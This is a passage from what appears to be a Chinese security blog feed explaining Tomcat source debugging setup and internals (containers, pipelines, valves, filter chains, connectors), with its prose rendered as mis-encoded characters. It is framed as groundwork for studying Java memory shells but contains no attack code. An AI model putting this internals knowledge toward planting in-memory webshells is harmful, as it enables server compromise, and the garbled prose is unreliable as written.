class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.eclipse.jdt.core.compiler<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ecj<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092054244.png" alt="image-20240909205433170"></p><p>ç„¶åé…ç½®ä¸€ä¸‹åˆé€‚çš„jdkç‰ˆæœ¬ï¼Œè¿™ä¸ªå°±ä¸å¤šè¯´äº†</p><p>ä¸‹ä¸€æ­¥é…ç½®configurationï¼Œæ·»åŠ ä¸€ä¸ªapplication</p><p><img src="https://cdn.clown2024.cn/202409092056897.png" alt="image-20240909205609843"></p><p>æ·»åŠ å…¥å£ç±»org.apache.catalina.startup.Bootstrap</p><blockquote><p>åœ¨æ­¤ä¹‹å‰éœ€è¦reloadä¸€ä¸‹mavené¡¹ç›®ï¼Œä¸ç„¶ä¼šä¸è¯†åˆ«ç›¸å…³çš„javaæºç </p></blockquote><p><img src="https://cdn.clown2024.cn/202409092057339.png" alt="image-20240909205701250"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å¯åŠ¨äº†</p><p><strong>é”™è¯¯ä¸€</strong></p><p>è¿™æ—¶å€™ä¼šé‡åˆ°ç¬¬ä¸€ä¸ªé”™è¯¯ï¼Œæ— æ³•è§£æjspï¼Œä¹Ÿå°±æ˜¯è®¿é—®localhost:8080ä¸æ˜¯tomcatçš„é¦–é¡µè€Œæ˜¯è¿”å›äº†500ï¼Œè¿™æ—¶å€™éœ€è¦å»æ·»åŠ ä¸€ä¸ªJSPè§£æå™¨ï¼Œéœ€è¦æˆ‘ä»¬å»ä¿®æ”¹æºç </p><p>æ‰¾åˆ°org.apache.catalina.startup.ContextConfigç±»ï¼Œåœ¨ConfigureStartæ–¹æ³•ä¸‹æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">context.addServletContainerInitializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JasperInitializer</span>(), <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092101636.png" alt="image-20240909210146552"></p><p><strong>é”™è¯¯äºŒ</strong></p><p>è¿™æ—¶å€™é¡µé¢è®¿é—®æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯æ§åˆ¶å°çš„æ—¥å¿—æ˜¯ä¹±ç çš„ï¼Œå¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409092047988.png" alt="image-20240909204702883"></p><p>è¿™æ˜¯å› ä¸ºåœ¨javaä¸­, è¯»å–æ–‡ä»¶çš„é»˜è®¤æ ¼å¼æ˜¯iso8859-1, è€Œæˆ‘ä»¬ä¸­æ–‡å­˜å‚¨çš„æ—¶å€™ä¸€èˆ¬æ˜¯UTF-8. æ‰€ä»¥å¯¼è‡´è¯»å‡ºæ¥çš„æ˜¯ä¹±ç ã€‚</p><p>æ–‡ç« ä¸­æœ‰ä¸¤ç§æ–¹å¼ä¿®æ”¹ä¹±ç ï¼Œæˆ‘è¿™é‡Œé‡‡ç”¨ä¿®æ”¹æºç çš„æ–¹å¼å»ä¿®æ”¹ï¼Œå°±æ˜¯æ‰¾åˆ°è¯»å–æ–‡ä»¶çš„åœ°æ–¹ï¼Œè½¬åŒ–ä¸€ä¸‹ç¼–ç æ–¹å¼ï¼Œè¿™é‡Œç›´æ¥copyä¸€ä¸‹è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥è‡ªå·±é€šè¿‡è°ƒè¯•å»æ‰¾åˆ°å¯¹åº”ä½ç½®(æˆ‘æ¯”è¾ƒæ‡’å°±ä¸è°ƒäº†)</p><ul><li><p>org.apache.tomcat.util.res.StringManagerç±»ä¸­çš„getString(final String key, final Objectâ€¦ args)æ–¹æ³•ï¼›æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        value =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(value.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092105213.png" alt="image-20240909210550131"></p></li><li><p>org.apache.jasper.compiler.Localizerç±»çš„getMessage(String errCode)æ–¹æ³•ï¼›æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        errMsg =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(errMsg.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>        e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092107159.png" alt="image-20240909210715069"></p></li></ul><p>åˆ°è¿™é‡Œå°±è§£å†³å®Œæˆ‘é‡åˆ°çš„æ‰€æœ‰é—®é¢˜ï¼Œå¯ä»¥å¿«ä¹è°ƒè¯•äº†ğŸ«¡</p><h2><span id="åŸç†åˆ†æ">åŸç†åˆ†æ</span></h2><p>æˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“Tomcatæ˜¯ä¸€ä¸ªservletå®¹å™¨ã€‚</p><h3><span id="httpservletrequestå’Œhttpservletresponse">HttpServletRequestå’ŒHttpServletResponse</span></h3><p><img src="https://cdn.clown2024.cn/202409112032626.png" alt="image-20240911203158516"></p><p><img src="https://cdn.clown2024.cn/202409112033582.png" alt="image-20240911203322536"></p><p>æˆ‘ä»¬çŸ¥é“HttpServletRequestå’ŒHttpServletResponseæ˜¯ä¸€ä¸ªæ¥å£ï¼Œæˆ‘ä»¬æ­£å¸¸å†™ä¸€ä¸ªservletå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servlettest;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        System.out.println(message);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br><br>        <br>        <span class="hljs-comment">// Hello</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;destory &quot;</span>+message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬è°ƒç”¨è¿™ä¸¤ä¸ªæ¥å£çš„æ–¹æ³•å°±éœ€è¦ä¸€ä¸ªå®ç°ç±»ï¼Œé‚£è¿™ä¸ªå®ç°ç±»æ˜¯è°åˆ›å»ºå‘¢ï¼Œå°±ç”±æˆ‘ä»¬çš„tomcatæ¥åˆ›å»º</p><p>å»çœ‹tomcatçš„æºç å°±å¯ä»¥çŸ¥é“RequestFacadeå°±æ˜¯å…¶ä¸­ä¸€ä¸ªå®ç°ç±»</p><p><img src="https://cdn.clown2024.cn/202409112036033.png" alt="image-20240911203618945"></p><p>ä¸è¿‡è¿™ä¸ªç±»åªæ˜¯ä¸€ä¸ªç±»ä¼¼é—¨é¢çš„ç±»ï¼Œé‡Œé¢çœŸæ­£çš„å®ç°æ˜¯Requestç±»ï¼Œé‡Œé¢çš„æ–¹æ³•æ›´å¤æ‚ï¼Œè¯¥ç±»ä¹Ÿæ˜¯å®ç°äº†Servletè§„èŒƒçš„ç±»</p><p><img src="https://cdn.clown2024.cn/202409121050908.png" alt="image-20240912105042783"></p><p>è¿™é‡Œå°±æ˜¯ç»™ä¸‹é¢çš„åˆ†æå½“ä¸ªå¼•å­ï¼Œå¼•å‘ä¸€ä¸‹æ€è€ƒã€‚</p><h3><span id="jaråŒ…å’ŒwaråŒ…">jaråŒ…å’ŒwaråŒ…</span></h3><p>æˆ‘ä»¬åœ¨tomcatéƒ¨ç½²é¡¹ç›®çš„æ—¶å€™ï¼Œå¯ä»¥å°†webé¡¹ç›®æ‰“åŒ…æˆwaråŒ…ç„¶åéƒ¨ç½²åˆ°tomcatçš„webappsç›®å½•ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409121053527.png" alt="image-20240912105338467"></p><p>å¯åŠ¨tomcatçš„æ—¶å€™ä»–å°±ä¼šè‡ªåŠ¨è§£å‹ï¼Œé‡Œé¢çš„å†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202409121054829.png" alt="image-20240912105432764"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨server.xmlé‡Œé¢è®¾ç½®æ˜¯å¦è¿›è¡Œè‡ªåŠ¨è§£å‹</p><p><img src="https://cdn.clown2024.cn/202409121055233.png" alt="image-20240912105551171"></p><p>é‚£ä¹ˆjaråŒ…å‘¢ï¼Ÿ</p><p>å…¶å®jarçš„å†…å®¹å’ŒwaråŒ…è§£å‹å‡ºæ¥æ˜¯æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«çš„ï¼Œjarå’ŒwaråŒ…ä¸»è¦æ˜¯tomcatå¯åŠ¨æ—¶ç”¨æ¥åŒºåˆ†è¿™æ˜¯ä¸€ä¸ªä¾èµ–è¿˜æ˜¯ä¸€ä¸ªåº”ç”¨</p><h3><span id="tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼">tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼</span></h3><p>éƒ¨ç½²çš„å‡ ç§æ–¹å¼å¯ä»¥åœ¨<strong>HostConfig#deployApps</strong>ä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/202409121100464.png" alt="image-20240912110054380"></p><ol><li>æè¿°ç¬¦éƒ¨ç½²</li><li>waråŒ…éƒ¨ç½²</li><li>æ–‡ä»¶å¤¹éƒ¨ç½²ï¼Œå°±æ˜¯å°†warè§£å‹çš„æ–‡ä»¶å¤¹ç›´æ¥æ”¾åˆ°webappsä¸‹é¢ï¼Œå’ŒwaråŒ…éƒ¨ç½²æ²¡ä»€ä¹ˆåŒºåˆ«</li></ol><blockquote><p>æºç ä¸­å¯ä»¥çœ‹åˆ°tomcatéƒ¨ç½²åº”ç”¨çš„æ—¶å€™æ˜¯è¿›è¡Œå¤šçº¿ç¨‹éƒ¨ç½²çš„</p></blockquote><p><strong>æè¿°ç¬¦éƒ¨ç½²</strong></p><p>æè¿°ç¬¦éƒ¨ç½²ç”¨çš„æ˜¯&lt;Context&gt;æ ‡ç­¾ï¼Œæ¯”å¦‚æˆ‘è¦å¸ƒç½®ä¸Šé¢çš„åº”ç”¨å¯ä»¥åœ¨server.xmlè¿™æ ·é…ç½®</p><p><img src="https://cdn.clown2024.cn/202409121117862.png" alt="image-20240912111717790"></p><p>docBaseå°±æ˜¯åº”ç”¨çš„ç›®å½•ï¼Œåˆ°æ—¶å€™tomcatå°±ä¼šä»è¯¥ç›®å½•æŸ¥æ‰¾æ‰€éœ€è¦çš„èµ„æºæ¯”å¦‚æˆ‘ä»¬çš„classæ–‡ä»¶</p><h3><span id="context">Context</span></h3><p>Contextçš„æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œæºç ä¸­å°±æœ‰ä¸€ä¸ªå«åšContextçš„æ¥å£</p><p><img src="https://cdn.clown2024.cn/202409121149984.png" alt="image-20240912114943927"></p><p>ä»–ç»§æ‰¿è‡ªä¸€ä¸ªContaineræ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹çœ‹Containeræœ‰å“ªäº›ç»§æ‰¿æ¥å£ï¼Œé‡Œé¢å°±åŒ…å«ç€tomcatçš„å››å¤§å®¹å™¨</p><h2><span id="tomcatå®¹å™¨">Tomcatå®¹å™¨</span></h2><p><img src="https://cdn.clown2024.cn/202409121151081.png" alt="image-20240912115147007"></p><p>tomcatçš„å››å¤§å®¹å™¨ï¼š</p><ul><li><p>Contextï¼šå°±æ˜¯ä¸€ä¸ªwebåº”ç”¨ç¨‹åºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢é…ç½®çš„ç¨‹åºï¼Œé…ç½®åœ¨HostèŠ‚ç‚¹ä¸‹é¢</p></li><li><p>Hostï¼šè¡¨ç¤ºä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹é¢å¯ä»¥æœ‰å¾ˆå¤šçš„åº”ç”¨</p><p><img src="https://cdn.clown2024.cn/202409121154456.png" alt="image-20240912115408390"></p><p>nameå°±æ˜¯ä¸»æœºåï¼ŒappBaseå°±æ˜¯åº”ç”¨ç›®å½•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦æ”¾åœ¨webappsä¸‹é¢</p></li><li><p>Engineï¼šå­—é¢æ„æ€å¼•æ“ï¼ŒHostæ˜¯Engineçš„å­èŠ‚ç‚¹</p><p><img src="https://cdn.clown2024.cn/202409121157589.png" alt="image-20240912115730532"></p><p>åœ¨Engineé‡Œé¢ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥å®šä¹‰å¤šä¸ªè™šæ‹Ÿä¸»æœºï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥å°†ä¸åŒçš„åº”ç”¨æ”¾åœ¨ä¸åŒçš„ä¸»æœºä¸‹ï¼Œé€šè¿‡ä¸åŒçš„ä¸»æœºåè®¿é—®å…·ä½“åº”ç”¨ï¼Œä¸è‡³äºå°†æ‰€æœ‰åº”ç”¨æ”¾åœ¨localhostä¸‹é¢ã€‚</p></li><li><p>Wrapperï¼šå®ƒå®é™…ä¸Šå°±å°è£…ç€ä¸€ä¸ªServletï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ªServletçš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è£…è½½ã€åˆå§‹åŒ–ã€èµ„æºå›æ”¶ç­‰ã€‚</p></li></ul><blockquote><p><img src="https://cdn.clown2024.cn/202409121216408.png" alt="image-20240912121655347"></p><p>æˆ‘ä»¬æ­£å¸¸ä¼šç»§æ‰¿ä¸€ä¸ªHttpServletï¼Œæ‰€æœ‰è®¿é—®è¿™ä¸ªServletçš„è¯·æ±‚æ˜¯å…±ç”¨ä¸€ä¸ªServletå®ä¾‹ä¹Ÿå°±æ˜¯å•ä¾‹æ¨¡å¼ï¼Œä½†å¦‚æœå®ç°SingleThreadModelæ¥å£çš„è¯å°±æ˜¯æ¯ä¸ªè¯·æ±‚å•ç‹¬æ‹¥æœ‰ä¸€ä¸ªå®ä¾‹</p></blockquote><p>æ•´ä¸ªå®¹å™¨çš„å±‚çº§ç»“æ„å°±å¦‚ä¸‹ï¼š<br>Engine&#x3D;&#x3D;ã€‹Host&#x3D;&#x3D;ã€‹Context&#x3D;&#x3D;ã€‹Wrapper&#x3D;&#x3D;ã€‹Servlet</p><p>å†è®²è®²ä¸ºä»€ä¹ˆè¦å¤šä¸€ä¸ªWrapperï¼Œå› ä¸ºæˆ‘ä»¬æœ‰æ—¶å€™ä¼šæœ‰å¤šä¸ªServletå®ä¾‹ï¼Œå…¨æ”¾åœ¨Contextä¸‹é¢ä¼šä¸å¥½ç®¡ç†ï¼Œæ‰€ä»¥å°±ç”¨Wrapperå°†Servletå®ä¾‹æŒ‰ç…§ç±»å‹ç®¡ç†èµ·æ¥ï¼Œæ‰€ä»¥å­˜å‚¨ç»“æ„ç±»ä¼¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>List&lt;Host&gt;<br>Host:<br>List&lt;Context&gt;<br>Context<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servletç±»<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><h3><span id="pipeline">Pipeline</span></h3><p>è¿™é‡Œä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p>pipelineç¿»è¯‘è¿‡æ¥å°±æ˜¯ç®¡é“ï¼Œæ¯ä¸€ä¸ªå®¹æ˜“éƒ½æœ‰ä¸€ä¸ªç®¡é“ç»„ä»¶ï¼Œpipelineé‡Œé¢åˆæœ‰valveé˜€é—¨</p><p>æ‰€ä»¥ä¸Šé¢çš„ç»“æ„åˆå¯ä»¥ä¼˜åŒ–æˆè¿™æ ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Host&gt;<br>Host:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Context&gt;<br>Context<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servletç±»<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„Requestå¯¹è±¡æƒ³è¦æœ€ç»ˆservleté‡Œé¢çš„doGetç­‰æ–¹æ³•ï¼Œä¼šç»è¿‡å‰é¢ä¸€ç³»åˆ—çš„å®¹å™¨ã€ç®¡é“ã€é˜€é—¨ã€‚</p><p>æ¯ä¸ªç®¡é“æœ€é‡è¦çš„æ˜¯æœ€åä¸€ä¸ªé˜€é—¨ï¼Œå› ä¸ºä»–è¦è´Ÿè´£å°†requestå¾€ä¸‹ä¸€ä¸ªå®¹å™¨è¿›è¡Œä¼ é€’ï¼Œæ‰€ä»¥æœ€åä¸€ä¸ªé˜€é—¨æ˜¯tomcatæå‰å†™å¥½çš„ã€‚</p><p><strong>ValveèŠ‚ç‚¹</strong></p><p>è¯¥èŠ‚ç‚¹é…ç½®åœ¨HostèŠ‚ç‚¹ä¸‹é¢ï¼Œå¯ä»¥é…ç½®ç»è¿‡è¯¥é˜€é—¨æ—¶éœ€è¦åšä»€ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦å»å®ç°æˆ–ç»§æ‰¿valveç›¸å…³çš„æ¥å£æˆ–ç±»å³å¯è‡ªå·±é…ç½®</p><p><img src="https://cdn.clown2024.cn/202409121354703.png" alt="image-20240912135432620"></p><p>æ¯”å¦‚ä¸‹é¢çš„è®°å½•æ—¥å¿—</p><p><img src="https://cdn.clown2024.cn/202409121200163.png" alt="image-20240912120035093"></p><h3><span id="standardwrapper">StandardWrapper</span></h3><p>è¿™é‡Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹Wrapperçš„pipelineçš„æœ€åä¸€ä¸ªvalveï¼Œå› ä¸ºä»–æ˜¯ç›´æ¥å’Œservletæ¥è§¦çš„ï¼›</p><p>Wrapperçš„å®ç°ç±»æ˜¯StandardWrapper</p><p><img src="https://cdn.clown2024.cn/202409121358782.png" alt="image-20240912135850663"></p><p>è¿™ä¸ªvalveå°±æ˜¯æˆ‘ä»¬è¯´çš„æœ€åä¸€ä¸ªvalve</p><p><img src="https://cdn.clown2024.cn/202409121400857.png" alt="image-20240912140039778"></p><p>å…·ä½“çš„é€»è¾‘åœ¨StandardWrapperValveçš„invokeæ–¹æ³•é‡Œé¢ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ¥å—äº†Requestå’ŒResponse</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä»–é‡Œé¢ä¸€äº›å…³é”®çš„æ­¥éª¤</p><p><img src="https://cdn.clown2024.cn/202409121956314.png" alt="image-20240912195619220"></p><p>è¿™é‡Œæ˜¯åˆ†é…servletå®ä¾‹çš„åœ°æ–¹ï¼Œæ–¹æ³•é‡Œçš„å…·ä½“é€»è¾‘å°±ä¸åˆ†æï¼ŒçŸ¥é“ä»–çš„ä½œç”¨å°±å¥½</p><p><img src="https://cdn.clown2024.cn/202409121957566.png" alt="image-20240912195722497"></p><p>ç„¶åè¿™é‡Œç”Ÿæˆäº†ä¸€ä¸ªfilterchainï¼Œå°†æˆ‘ä»¬çš„requestã€wrapperã€serveltéƒ½å°è£…äº†è¿›å»ï¼Œè¿™é‡Œçš„filterchainå°±æ˜¯æˆ‘ä»¬å‰é¢æåˆ°Filter</p><p><img src="https://cdn.clown2024.cn/202409122000325.png" alt="image-20240912200056244"></p><p>ç„¶åæœ€ç»ˆçš„æ“ä½œå°±æ˜¯åœ¨æˆ‘ä»¬çš„doFilteré‡Œé¢è¿›è¡Œï¼Œæˆ‘ä»¬è‡ªå·±è¦å»ºç«‹Filterä¹Ÿæ˜¯åƒå†™servletä¸€æ ·ï¼Œå†™ä¸€ä¸ªç±»ç»§æ‰¿Filterç›¸å…³çš„æ¥å£ï¼Œç„¶ååœ¨web.xmlä¸­é…ç½®ï¼Œå’Œè¦è¿‡æ»¤çš„servletå¯¹åº”èµ·æ¥</p><p><img src="https://cdn.clown2024.cn/202409122007925.png" alt="image-20240912200740837"></p><p>åé¢çš„è°ƒç”¨æµç¨‹å°±è‡ªå·±è°ƒä¸€ä¸‹æºç çœ‹çœ‹å°±å¥½äº†</p><h2><span id="tomcat-connector">Tomcat Connector</span></h2><p>æˆ‘ä»¬åœ¨å‰é¢çš„Tomcatæ¶æ„å›¾å¯ä»¥çœ‹åˆ°æœ‰Connectorç»„ä»¶ï¼Œtomcatæœ‰ä¸¤ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼š</p><p>1.å¤„ç† Socket è¿æ¥ï¼Œè´Ÿè´£ç½‘ç»œå­—èŠ‚æµä¸ Request å’Œ Response å¯¹è±¡çš„è½¬åŒ–ã€‚</p><p>2.åŠ è½½å’Œç®¡ç† Servletï¼Œä»¥åŠå…·ä½“å¤„ç† Request è¯·æ±‚ã€‚</p><p>æˆ‘ä»¬çš„Containerç»„ä»¶è´Ÿè´£å†…éƒ¨Servletçš„ç®¡ç†å’Œå¤„ç†è¿‡æ¥çš„Requestè¯·æ±‚ï¼Œé‚£å¤–éƒ¨ä¼ è¿‡æ¥çš„æ•°æ®æ˜¯æ€ä¹ˆç”ŸæˆRequestå¯¹è±¡çš„å‘¢ï¼Œè¿™é çš„å°±æ˜¯Connectorç»„ä»¶åˆ©ç”¨Socketæ¥å—æ“ä½œç³»ç»Ÿä¼ è¿‡æ¥çš„æ•°æ®ï¼Œç„¶åç”ŸæˆRequestå’ŒResponseå¯¹è±¡ã€‚</p><p>åœ¨Tomcatä¸­æœ‰ä¸€ä¸ªConnectorç±»å¯ä»¥å»çœ‹çœ‹ä»–çš„setProtocolæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409221831079.png" alt="image-20240922183030860"></p><p>ä»–è¿™é‡Œä¼šæ ¹æ®é€‰æ‹©ä¸åŒçš„å¤„ç†ç±»ï¼Œè¿™ä¸ªprotocolå°±æ˜¯æˆ‘ä»¬server.xmlé‚£é‡Œé…ç½®çš„</p><p><img src="https://cdn.clown2024.cn/202409221835409.png" alt="image-20240922183544328"></p><p>ç„¶åHTTP1.1å¯¹åº”çš„ä¸¤ä¸ªå¤„ç†ç±»çš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">org.apache.coyote.http11.Http11AprProtocol ---BIO<br>org.apache.coyote.http11.Http11NioProtocol ---NIO<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™äº›ç±»å°±æ˜¯è´Ÿè´£socketçš„è¿æ¥ç®¡ç†å’Œæ•°æ®è¯»å–ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å»çœ‹ä¸€ä¸‹ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹Http11NioProtocolçš„NIOè¯»å–æ•°æ®</p><p><img src="https://cdn.clown2024.cn/202409222021606.png" alt="image-20240922202104507"></p><p>è¿™é‡Œé¢newäº†ä¸€ä¸ªNioEndpointï¼Œè¿™å°±æ˜¯tomcatçš„ä¸€ä¸ªè¿æ¥å™¨ï¼Œç”¨äºå¤„ç†ç½‘ç»œè¿æ¥ï¼Œçœ‹ä¸€ä¸‹ä»–é‡Œé¢çš„æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222023442.png" alt="image-20240922202358352"></p><p>è¿™é‡Œçš„Acceptorç±»æ˜¯ä¸€ä¸ªç”¨äºå¤šçº¿ç¨‹æ‰§è¡Œä»»åŠ¡çš„ï¼Œå› ä¸ºAbstractEndpoint.Acceptorå®ç°äº†Runnableæ¥å£ï¼Œç„¶åä¸‹é¢å¯ä»¥çœ‹åˆ°å®ƒacceptäº†socketè¿æ¥</p><p>é‚£æ¥å—äº†socketä¹‹åå°±éœ€è¦å»å¤„ç†è¿™ä¸ªsocketè¿æ¥ï¼Œæˆ‘ä»¬æ¥ç€çœ‹</p><p><img src="https://cdn.clown2024.cn/202409222031639.png" alt="image-20240922203110543"></p><p>è¿™é‡Œå°±ä¼šè°ƒç”¨ä¸€ä¸ªsetSocketOptionsæ¥å¤„ç†socketï¼Œå¦‚æœè¿”å›falseåˆ™å…³é—­socketï¼Œæˆ‘çœ‹è§†é¢‘é‡Œçš„ç‰ˆæœ¬ä»–çš„æ˜¯porcessSocketæ–¹æ³•(å¯èƒ½æ˜¯bioçš„æ–¹æ³•)ï¼Œæˆ‘çœ‹äº†æˆ‘çš„bioæ–¹æ³•å®ƒä½¿ç”¨çš„æ˜¯<strong>processSocketWithOptions</strong>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222045016.png" alt="image-20240922204517909"></p><p>nioè¿˜æ²¡å­¦ä¹ çœ‹ä¸å¤ªæ˜ç™½ï¼Œä½†æ˜¯æœ€ç»ˆå°±æ˜¯åœ¨è¿™é‡Œå¤„ç†äº†ï¼ŒBIOå°±æ˜¯ä½¿ç”¨çº¿ç¨‹æ± çš„æ–¹å¼æ¥è¯»å–socketæ•°æ®</p><p><img src="https://cdn.clown2024.cn/202409222049587.png" alt="image-20240922204936475"></p><p>è¿™æ˜¯bioçš„è¯»å–æ–¹å¼ï¼Œç„¶åç»§ç»­å¾€ä¸‹è·Ÿå°±æ˜¯ä¸€äº›æ•°æ®è§£æç„¶åæ„é€ Requestå¯¹è±¡ï¼Œå°±ä¸åˆ†æï¼Œæœ‰ä¸ªå¤§æ¦‚æ¦‚å¿µå°±è¡Œã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å­¦å†…å­˜é©¬å‰å°±è¦æ¥å­¦ä¸€å­¦java webä¸‰å¤§ä»¶çš„ç›¸å…³åŸç†ï¼šServletã€Filterã€Listener&lt;/p&gt;
&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.cnblogs.com/jadite/p/16951328.html&quot;&gt;https://www.cnbl</summary>
      
    
    
    
    <category term="javaåŸºç¡€" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>fastjsonååºåˆ—åŒ–</title>
